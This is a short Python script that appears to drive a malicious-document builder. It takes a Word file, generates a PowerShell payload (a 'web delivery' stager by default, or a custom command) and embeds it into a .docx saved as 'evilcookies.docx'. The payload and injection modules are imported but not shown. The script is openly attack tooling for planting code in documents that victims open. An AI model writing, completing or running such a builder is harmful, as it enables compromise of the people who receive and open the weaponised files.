#!/usr/bin/python3

import argparse
import payloads
import xmlparser

from utils import *		# import sys, os, io, zipfile, __location__


def main():
	parser = argparse.ArgumentParser()

	parser.add_argument('-i', '--input_file', action='store', required=True, help='Payload carrier file')
	parser.add_argument('-o', '--output_file', action='store', required=True, help='File with payload attached')
	parser.add_argument('-c', '--custom_payload', action='store_true', help='Override the default web delivery method with a custom CMD/PSH payload')
	parser.add_argument('-v', '--verbose', action='store_true', help='Show verbose output')
	parser.add_argument('--debug', action='store_true', help='Print debug statements')

	arg = parser.parse_args()
	local_dir = os.path.dirname(os.path.realpath(__file__))
	templates_dir = os.path.join(local_dir, 'templates')
	output_dir = os.path.join(local_dir, 'output')

	if arg.debug:
		logging.basicConfig(stream=sys.stderr, level=logging.DEBUG)
	if arg.verbose:
		global verbose
		verbose = True

	# Default directory structure, and retrieve input/output directories
	# print("Here is where our ingredients will come from: ", arg.input_file)			# DEBUG, print the location of input file
	if not arg.input_file:
		arg.input_file = os.path.join(templates_dir, 'blank.docx')
	if not arg.output_file:
		if not os.path.exists(output_dir):
			os.mkdir(output_dir)
		arg.output_file = os.path.join(output_dir, "evilcookies.docx")


	# Where the magic happens
	if arg.custom_payload:
		payload = payloads.Powershell('docx', arg.output_file).custom()
	else:
		payload = payloads.Powershell('docx', arg.output_file).web_delivery()

	evil_cookies = xmlparser.DocxParser(arg.input_file, arg.output_file, payload)
	evil_cookies.build()


if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		print("Thanks for a fun time! ~<3\n")
		sys.exit(0)
